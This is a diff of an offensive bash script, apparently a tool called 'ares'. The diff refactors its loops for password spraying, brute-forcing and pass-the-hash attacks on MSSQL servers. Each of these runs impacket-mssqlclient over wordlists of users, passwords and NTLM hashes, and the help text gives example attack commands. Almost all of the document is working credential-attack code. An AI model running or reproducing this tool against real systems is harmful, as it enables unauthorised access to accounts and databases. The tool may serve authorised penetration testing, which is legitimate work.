@@ -2,8 +2,6 @@
 
 # TO DO: Consider implementing multiprocessing. On success, auto terminate & print creds?
 
-# Condense by only having 1 'while' statement to get creds then using 'if' inside it to determine whether or not to incl '-windows-auth'
-
 line="\n============================================================\n"
 domain=""
 auth=""
@@ -21,7 +19,7 @@ login=""
 
 Help()
 {
-cat <<EOF
+  cat <<EOF
 [Options]
 	-h: Display this help message
 	-i <IP_ADDRESS>: The target server's IP Address or hostname
@@ -53,7 +51,7 @@ ares -m mssql -x spray -a -i 123.45.67.890 -s 8000 -d xample.local/ -U /tmp/user
 ares -m mssql -x brute -a -i 123.45.67.890 -U /tmp/user.txt -N /tmp/hashes.txt
 
 EOF
-exit 0
+  exit 0
 }
 
 Authentication()
@@ -204,57 +202,39 @@ EOF
         read password
       fi
 
+      while IFS= read -r user; do
+        login="$domain"
+	login+="$user"
+	cat <<EOF
+$line
+[+] Credentials: ${login}:${password}@${target}
+
+EOF
+
       if [[ "$auth" == "sql" ]]; then
-        while IFS= read -r user; do
-          login="$domain"
-          login+="$user"
-	  cat <<EOF
-$line
-[+] Credentials: ${login}:${password}@${target}
-
-EOF
-          impacket-mssqlclient -no-pass -port "$port" "${login}:${password}@${target}"
-        done < "$user_list"
+        impacket-mssqlclient -no-pass -port "$port" "${login}:${password}@${target}"
       else
-        while IFS= read -r user; do
-          login="$domain"
-          login+="$user"
-	  cat <<EOF
-$line
-[+] Credentials: ${login}:${password}@${target}
-
-EOF
-          impacket-mssqlclient -windows-auth -no-pass -port "$port" "${login}:${password}@${target}"
-
-        done < "$user_list"
+        impacket-mssqlclient -windows-auth -no-pass -port "$port" "${login}:${password}@${target}"
       fi
+    done < "$user_list"
 
     elif [[ -n "$ntlm" ]]; then
+      while IFS= read -r user; do
+        login="$domain"
+        login+="$user"
+        cat <<EOF
+$line
+[+] Credentials: ${login}@${target}
+[+] Hash: $ntlm
+
+EOF
+
       if [[ "$auth" == "sql" ]]; then
-        while IFS= read -r user; do
-          login="$domain"
-          login+="$user"
-          cat <<EOF
-$line
-[+] Credentials: ${login}@${target}
-[+] Hash: $ntlm
-
-EOF
-          impacket-mssqlclient -no-pass -port "$port" -hashes "$ntlm" "${login}@${target}"
-        done < "$user_list"
+        impacket-mssqlclient -no-pass -port "$port" -hashes "$ntlm" "${login}@${target}"
       else
-        while IFS= read -r user; do
-          login="$domain"
-          login+="$user"
-          cat <<EOF
-$line
-[+] Credentials: ${login}@${target}
-[+] Hash: $ntlm
-
-EOF
-	  impacket-mssqlclient -windows-auth -no-pass -port "$port" -hashes "$ntlm" "${login}@${target}"
-        done < "$user_list"
+        impacket-mssqlclient -windows-auth -no-pass -port "$port" -hashes "$ntlm" "${login}@${target}"
       fi
+    done <"$user_list"
     fi
     ;;
 
@@ -267,50 +247,34 @@ EOF
     login="${domain}${username}"
 
     if [[ -n "$pass_list" ]]; then
-      if [[ "$auth" == "sql" ]]; then
-        while IFS= read -r pass; do
-	  cat <<EOF
+      while IFS= read -r pass; do
+        cat <<EOF
 $line
 [+] Credentials: ${login}:${pass}@${target}
 
 EOF
+        if [[ "$auth" == "sql" ]]; then
 	  impacket-mssqlclient -no-pass -port "$port" "${login}:${pass}@${target}"
-        done < "$pass_list"
-      else
-        while IFS= read -r pass; do
-	  cat <<EOF
-$line
-[+] Credentials: ${login}:${pass}@${target}
-
-EOF
-	  impacket-mssqlclient -windows-auth -no-pass -port "$port" "${login}:${pass}@${target}"
-        done < "$pass_list"
-      fi
+        else
+          impacket-mssqlclient -windows-auth -no-pass -port "$port" "${login}:${pass}@${target}"
+	fi
+      done < "$pass_list"
 
     elif [[ -n "$ntlm_list" ]]; then
-      if [[ "$auth" == "sql" ]]; then
-        while IFS= read -r hash; do
-	  cat <<EOF
+      while IFS= read -r hash; do
+        cat <<EOF
 $line
 [+] Credentials: ${login}@${target}
 [+] Hash: $hash
 
 EOF
 
+        if [[ "$auth" == "sql" ]]; then
 	  impacket-mssqlclient -no-pass -port "$port" -hashes "$hash" "${login}@${target}"
-        done < "$ntlm_list"
-      else
-        while IFS= read -r hash; do
-          cat <<EOF
-$line
-[+] Credentials: ${login}@${target}
-[+] Hash: $hash
-
-EOF
+        else
 	  impacket-mssqlclient -windows-auth -no-pass -port "$port" -hashes "$hash" "${login}:${pass}@${target}"
-        done < "$ntlm_list"
-      fi
-
+        fi
+      done < "$ntlm_list"
     fi
     ;;
 
@@ -319,28 +283,19 @@ EOF
       echo -e "\nEnter the file path for a wordlist containing colon seperated credentials (e.g., USER:PASS)\n"
       read cred_list
     fi
-
-    if [[ "$auth" == "sql" ]]; then 
-      while IFS= read -r creds; do
-        login="${domain}${creds}"
-        cat <<EOF
+    while IFS= read -r creds; do
+      login="${domain}${creds}"
+      cat <<EOF
 $line
 [+] Credentials: ${login}@${target}
 
 EOF
+      if [[ "$auth" == "sql" ]]; then 
         impacket-mssqlclient -no-pass -port $port "${login}@${target}"
-      done < "$cred_list"
-    else
-      while IFS= read -r creds; do
-        login="${domain}${creds}"
-        cat <<EOF
-$line
-[+] Credentials: ${login}@${target}
-
-EOF
+      else
         impacket-mssqlclient -windows-auth -no-pass -port $port "${login}@${target}"
-      done < "$cred_list"
-    fi
+      fi
+    done < "$cred_list"
     ;;
 
   brute)
@@ -378,7 +333,6 @@ EOF
 	  fi
         done 3< "$ntlm_list"
       fi
-
     done < "$user_list"
     ;;
 
